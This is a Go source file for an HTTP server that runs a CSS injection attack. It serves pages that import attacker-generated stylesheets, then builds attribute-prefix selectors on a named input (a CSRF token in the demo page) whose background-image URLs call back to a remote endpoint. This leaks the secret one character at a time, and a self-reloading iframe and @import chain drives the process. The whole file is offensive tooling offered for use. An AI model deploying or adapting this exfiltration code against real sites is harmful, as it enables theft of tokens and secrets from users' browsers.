package server

import (
	"fmt"
	"net/http"
	"strconv"
)

var (
	secretName    string
	currentSecret string
	listOfChar    string
	verbose       bool
	lenSecret     int
)

func hello(rw http.ResponseWriter, req *http.Request) {
	if verbose {
		fmt.Print("[DEBUG] Request made to \"hello/\"\n")
	}

	var webpage string = `
	<html>
		<style> @import url("/launchAttack"); </style>
		<input name="csrf" value="abc123" class="csrf">
	</html>
	`

	fmt.Fprint(rw, webpage)
}

func attack(rw http.ResponseWriter, req *http.Request) {

	if verbose {
		fmt.Print("[DEBUG] Request made to \"attack/\"\n")
	}

	var css string = createCSS()

	fmt.Fprint(rw, css)

}

func launchAttack(rw http.ResponseWriter, req *http.Request) {
	var webpage string = ""

	if verbose {
		fmt.Print("[DEBUG] Request made to \"launchAttack/\"\n")
	}

	for i := range lenSecret {
		webpage += "<style> @import url(\"/attack?len=" + strconv.Itoa(i) + "\")</style>\n"
	}
	webpage += "<iframe src=\"/launchAttack\"> </iframe>"

	fmt.Fprint(rw, webpage)
}

func createCSS() string {
	var css string = ""
	for _, ch := range listOfChar {
		css += "input[name=" + secretName + "][value^=" + currentSecret + string(ch) + "]"
		css += "{\n\tbackground-image: url(https://localhost.com/attack/" + string(ch) + ");\n}\n\n"
	}

	return css

}

func StartTool(port int, secret string, listChar string, v bool, ls int) {
	secretName = secret
	currentSecret = ""
	listOfChar = listChar
	verbose = v
	lenSecret = ls

	launchServer(port)
}

func launchServer(port int) {

	fmt.Printf("Server launch on port %d\n", port)

	http.HandleFunc("/hello", hello)
	http.HandleFunc("/launchAttack", launchAttack)
	http.HandleFunc("/attack", attack)

	http.ListenAndServe(":"+strconv.Itoa(port), nil)

}
